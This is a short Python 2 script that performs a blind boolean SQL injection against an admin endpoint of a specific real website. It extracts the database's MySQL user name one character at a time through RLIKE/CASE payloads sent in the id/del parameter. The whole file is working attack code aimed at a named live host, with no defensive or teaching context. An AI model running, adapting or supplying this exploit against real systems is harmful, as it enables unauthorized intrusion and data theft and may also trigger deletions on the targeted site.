#encoding=utf-8

import httplib

import time

import string

import sys

import random

import urllib



headers = {}

payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

print 'Start to retrive MySQL User:'

user = ''

for i in range(1,21):

    for payload in payloads:

        conn = httplib.HTTPConnection('active.zol.com.cn', timeout=5)

        s = "/08active/admin/326gs/operate.php?id=8946&del=1+RLIKE+(SELECT+(CASE+WHEN+(ascii(substring((user()),%s,1))=%s)+THEN+1+ELSE+0x28+END))" % (i, ord(payload))

        conn.request(method='head',

                     url=s,

                     headers=headers)

        html_doc = conn.getresponse().read()

        conn.close()

        print '.',

        verfy = "alert"

        if verfy in html_doc:

            user += payload

            sys.stdout.write('\n[In progress] %s' % user)

            sys.stdout.flush()

            break

print '\n[Done]MySQL user is', user
